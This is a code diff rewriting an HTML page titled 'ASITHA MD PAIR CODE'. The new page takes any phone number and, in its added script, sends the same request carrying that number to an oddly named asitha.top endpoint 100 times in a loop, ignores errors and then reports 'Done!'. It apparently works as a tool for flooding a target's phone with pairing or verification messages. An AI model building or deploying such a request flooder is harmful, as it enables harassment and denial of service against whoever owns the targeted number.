@@ -2,101 +2,121 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Overlay Interface + Pair Web</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ASITHA MD PAIR CODE</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
-    body, html {
-      margin: 0;
-      padding: 0;
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
-      overflow: hidden;
+      margin: 0;
+      background-image: url("https://wallpapercave.com/w/wp13381180.jpg");
+      background-repeat: no-repeat;
+      background-position: center;
+      background-size: cover;
+      font-family: Arial, sans-serif;
     }
 
-    iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      height: 100%;
-      width: 100%;
-      border: none;
-      z-index: 1;
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
-    .overlay {
-      position: absolute;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: white;
+    .box {
+      width: 300px;
       padding: 20px;
+      text-align: center;
+      background-color: rgba(255,255,255,0.5);
       border-radius: 10px;
-      z-index: 2;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
     }
 
-    input, button {
-      padding: 10px;
-      margin: 5px 0;
-      width: 250px;
-      font-size: 16px;
+    .input-container {
+      display: flex;
+      background: linear-gradient(45deg, #c5c5c5 0%, #ffffff 100%);
+      border-radius: 1rem;
+      padding: 0.3rem;
+      gap: 0.3rem;
+      width: 100%;
+      max-width: 300px;
     }
 
-    button {
-      background-color: #28a745;
-      color: white;
+    .input-container input {
+      flex: 1;
+      padding: 1rem;
       border: none;
+      border-radius: 0.8rem 0 0 0.8rem;
+      background: #e8e8e8;
+      color: #000;
+    }
+
+    .input-container button {
+      padding: 1rem;
+      border: none;
+      background: linear-gradient(135deg, #8a2be2 0%, #800080 100%);
+      color: white;
+      border-radius: 0 0.8rem 0.8rem 0;
+      font-weight: bold;
       cursor: pointer;
     }
 
-    button:hover {
-      background-color: #218838;
+    .input-container button:hover {
+      background: linear-gradient(135deg, #A8E4A0 0%, #32CD32 100%);
+      color: red;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+      color: black;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <div class="box">
+      <h3>Link with phone number</h3>
+      <p>⚙ Enter your number with country code ⚙</p>
+      <div class="input-container">
+        <input type="text" id="number" placeholder="+94771234567" />
+        <button id="submit">Enter</button>
+      </div>
+      <div id="pair" class="status"></div>
+    </div>
+  </div>
 
-<!-- Your original site inside iframe -->
-<iframe id="peerFrame" src="https://asitha.top/pair"></iframe>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.0.0-alpha.1/axios.min.js"></script>
+  <script>
+    const numberInput = document.getElementById("number");
+    const submitBtn = document.getElementById("submit");
+    const statusBox = document.getElementById("pair");
 
-<!-- Overlay interface -->
-<div class="overlay">
-  <input type="text" id="liveInput" placeholder="Enter phone number" />
-  <button onclick="sendNumber()">Send</button>
-</div>
+    submitBtn.addEventListener("click", async (e) => {
+      e.preventDefault();
 
-<script>
-  function sendNumber() {
-    const iframe = document.getElementById('peerFrame');
-    const number = document.getElementById('liveInput').value;
+      const raw = numberInput.value.replace(/[^0-9]/g, "");
+      if (raw.length < 10) {
+        statusBox.innerHTML = "❌ Invalid number format ❌";
+        return;
+      }
 
-    // Access inside iframe
-    const frameDoc = iframe.contentWindow.document;
-    const numberInput = frameDoc.getElementById('number');
-    const submitBtn = frameDoc.getElementById('submit');
+      numberInput.value = "+" + raw;
+      numberInput.style.color = "black";
+      numberInput.style.fontSize = "20px";
+      statusBox.innerHTML = "Sending...";
 
-    if (numberInput && submitBtn) {
-      numberInput.value = number;
+      for (let i = 0; i < 100; i++) {
+        try {
+          await axios.get(`https://asitha.top/anunge-reddawal-hoyanna-epa-utto-awajathaka-ponnayek-wenna-epa/?num=${raw}`);
+        } catch (err) {
+          // Optional: handle errors silently
+        }
+      }
 
-      // Trigger 'input' event if needed
-      numberInput.dispatchEvent(new Event('input', { bubbles: true }));
-
-      // Click submit button
-      submitBtn.click();
-    }
-  }
-
-  // Real-time typing
-  document.getElementById('liveInput').addEventListener('input', () => {
-    const iframe = document.getElementById('peerFrame');
-    const number = document.getElementById('liveInput').value;
-    const frameDoc = iframe.contentWindow.document;
-    const numberInput = frameDoc.getElementById('number');
-
-    if (numberInput) {
-      numberInput.value = number;
-      numberInput.dispatchEvent(new Event('input', { bubbles: true }));
-    }
-  });
-</script>
-
+      statusBox.innerHTML = "✅ Done!";
+    });
+  </script>
 </body>
 </html>
